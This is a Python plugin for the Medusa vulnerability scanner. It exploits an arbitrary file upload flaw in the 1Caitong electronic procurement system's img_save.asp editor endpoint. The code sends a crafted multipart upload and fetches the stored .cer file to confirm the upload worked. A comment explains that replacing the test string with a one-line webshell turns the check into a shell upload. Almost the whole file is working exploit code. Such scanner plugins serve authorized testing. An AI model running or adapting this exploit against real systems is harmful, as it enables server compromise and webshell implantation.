#!/usr/bin/env python
# -*- coding: utf-8 -*-

__author__ = 'Ascotbe'
__times__ = '2019/10/13 22:12 PM'
import requests
import re
import ClassCongregation
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="0" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date']  = "2020-1-5"  # 插件编辑时间
        self.info['disclosure']='2015-11-07'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "OneCaitongElectronicProcurementSystemUploadsArbitraryFiles2"  # 插件名称
        self.info['name'] ='一采通电子采购系统任意文件上传' #漏洞名称
        self.info['affects'] = "1Caitong"  # 漏洞组件
        self.info['desc_content'] = "/library/editornew/Editor/img_save.asp位置存在任意文件上传"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['version'] = "暂无"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果

def medusa(**kwargs)->None:
    url = kwargs.get("Url")  # 获取传入的url参数
    Headers = kwargs.get("Headers")  # 获取传入的头文件
    proxies = kwargs.get("Proxies")  # 获取传入的代理参数
    try:
        RD=ClassCongregation.randoms().result(20)
        payload = "/library/editornew/Editor/img_save.asp"
        payload_url = url + payload
        data = '''
------WebKitFormBoundaryNjZKAB66SVyL1INA
Content-Disposition: form-data; name="img_src"; filename="123.cer"
Content-Type: application/x-x509-ca-cert

{}
------WebKitFormBoundaryNjZKAB66SVyL1INA
Content-Disposition: form-data; name="Submit"

提交
------WebKitFormBoundaryNjZKAB66SVyL1INA
Content-Disposition: form-data; name="img_alt"


------WebKitFormBoundaryNjZKAB66SVyL1INA
Content-Disposition: form-data; name="img_align"

baseline
------WebKitFormBoundaryNjZKAB66SVyL1INA
Content-Disposition: form-data; name="img_border"


------WebKitFormBoundaryNjZKAB66SVyL1INA
Content-Disposition: form-data; name="newid"

45
------WebKitFormBoundaryNjZKAB66SVyL1INA
Content-Disposition: form-data; name="img_hspace"


------WebKitFormBoundaryNjZKAB66SVyL1INA
Content-Disposition: form-data; name="img_vspace"


------WebKitFormBoundaryNjZKAB66SVyL1INA--
'''.format(RD)
        Headers['Content-Type']='application/x-www-form-urlencoded'
        Headers['Accept']='text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'

        resp = requests.post(payload_url,data=data,headers=Headers,proxies=proxies, timeout=6, verify=False)
        con = resp.text
        match = re.search(r'getimg\(\'([\d]+.cer)\'\)', con)
        if match:
            payload_url2 = url  + "/library/editornew/Editor/NewImage/"+match.group(1)
            resp2 = requests.get(payload_url2, headers=Headers, timeout=6,proxies=proxies, verify=False)
            con2 = resp2.text
            code2 = resp2.status_code
            #如果要上传shell直接把testvul这个值改为一句话就可以
            if code2 == 200 and con2.lower().find(RD) != -1:
                Medusa = "{}存在一采通电子采购系统任意文件上传漏洞\r\n 验证数据:\r\nshell地址:{}\r\n内容:{}\r\n".format(url,payload_url2,con2)
                _t=VulnerabilityInfo(Medusa)
                ClassCongregation.VulnerabilityDetails(_t.info, resp2,**kwargs).Write()  # 传入url和扫描到的数据
                ClassCongregation.WriteFile().result(str(url), str(Medusa))  # 写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ClassCongregation.ErrorHandling().Outlier(e, _)
        _l = ClassCongregation.ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)#调用写入类